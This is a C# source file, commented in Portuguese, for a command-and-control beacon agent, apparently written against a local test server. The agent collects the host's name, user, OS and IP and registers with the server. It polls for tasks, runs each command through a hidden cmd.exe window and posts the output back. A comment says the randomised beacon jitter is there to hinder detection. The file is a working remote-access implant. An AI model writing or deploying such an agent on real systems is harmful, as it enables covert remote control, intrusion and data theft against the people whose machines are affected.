using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Net.NetworkInformation;

class Agent
{
    // ── Configuração ──────────────────────────────────────────────
    static readonly string SERVER_URL     = "http://localhost:3000";
    static readonly int    BEACON_MIN_MS  = 5000;   // intervalo mínimo
    static readonly int    BEACON_MAX_MS  = 12000;  // intervalo máximo (jitter)

    static readonly HttpClient http = new HttpClient();
    static string agentId = "";

    // ── Entry point ───────────────────────────────────────────────
    static async Task Main(string[] args)
    {
        Console.WriteLine("[*] Agente iniciado...");

        // 1. Registra no servidor e salva o ID retornado
        agentId = await Register();
        if (string.IsNullOrEmpty(agentId))
        {
            Console.WriteLine("[-] Falha ao registrar. Encerrando.");
            return;
        }

        Console.WriteLine($"[+] Registrado com ID: {agentId}");

        // 2. Loop infinito de beacon
        while (true)
        {
            try
            {
                // Re-check-in (atualiza lastSeen no servidor)
                await Register();

                // Busca tarefas pendentes
                var tasks = await GetTasks();

                foreach (var task in tasks)
                {
                    string taskId  = task.GetProperty("_id").GetString() ?? "";
                    string command = task.GetProperty("command").GetString() ?? "";

                    Console.WriteLine($"[>] Executando: {command}");

                    string output = ExecuteCommand(command);

                    // Devolve resultado ao servidor
                    await SendResult(taskId, output);

                    Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Erro no beacon: {ex.Message}");
            }

            // Sleep com jitter — intervalo variável dificulta detecção por padrão
            var rng   = new Random();
            int delay = rng.Next(BEACON_MIN_MS, BEACON_MAX_MS);
            Console.WriteLine($"[*] Aguardando {delay / 1000}s...");
            Thread.Sleep(delay);
        }
    }

    // ── Coleta informações da máquina e registra no servidor ──────
    static async Task<string> Register()
    {
        var payload = new
        {
            hostname = Environment.MachineName,
            username = Environment.UserName,
            os       = Environment.OSVersion.ToString(),
            ip       = GetLocalIP(),
            arch     = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            pid      = Environment.ProcessId
        };

        string json     = JsonSerializer.Serialize(payload);
        var    content  = new StringContent(json, Encoding.UTF8, "application/json");
        var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
        string body     = await response.Content.ReadAsStringAsync();

        var doc = JsonDocument.Parse(body);

        // Retorna o _id do agente criado ou atualizado
        return doc.RootElement
                  .GetProperty("agent")
                  .GetProperty("_id")
                  .GetString() ?? "";
    }

    // ── Busca tarefas pendentes para este agente ──────────────────
    static async Task<JsonElement[]> GetTasks()
    {
        var response = await http.GetAsync($"{SERVER_URL}/api/tasks/agent/{agentId}");
        string body  = await response.Content.ReadAsStringAsync();

        var doc = JsonDocument.Parse(body);
        return doc.RootElement.EnumerateArray().ToArray() ?? Array.Empty<JsonElement>();
    }

    // ── Envia o output de um comando de volta ao servidor ─────────
    static async Task SendResult(string taskId, string output)
    {
        var payload = new { output };
        string json    = JsonSerializer.Serialize(payload);
        var    content = new StringContent(json, Encoding.UTF8, "application/json");
        await http.PutAsync($"{SERVER_URL}/api/tasks/{taskId}/result", content);
    }

    // ── Executa um comando no sistema e retorna o output ──────────
    static string ExecuteCommand(string command)
    {
        try
        {
            // Comandos built-in do Windows (dir, cd, echo, etc.) precisam do cmd.exe
            var proc = new Process();
            proc.StartInfo.FileName               = "cmd.exe";
            proc.StartInfo.Arguments              = $"/c {command}";
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.StartInfo.UseShellExecute        = false;
            proc.StartInfo.CreateNoWindow         = true;  // sem janela visível
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd()
                          + proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            return string.IsNullOrWhiteSpace(output)
                ? "[comando executado sem output]"
                : output;
        }
        catch (Exception ex)
        {
            return $"[erro ao executar]: {ex.Message}";
        }
    }

    // ── Pega o IP local da máquina ────────────────────────────────
    static string GetLocalIP()
    {
        foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (iface.OperationalStatus != OperationalStatus.Up) continue;
            if (iface.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

            foreach (var addr in iface.GetIPProperties().UnicastAddresses)
            {
                if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return addr.Address.ToString();
            }
        }
        return "unknown";
    }
}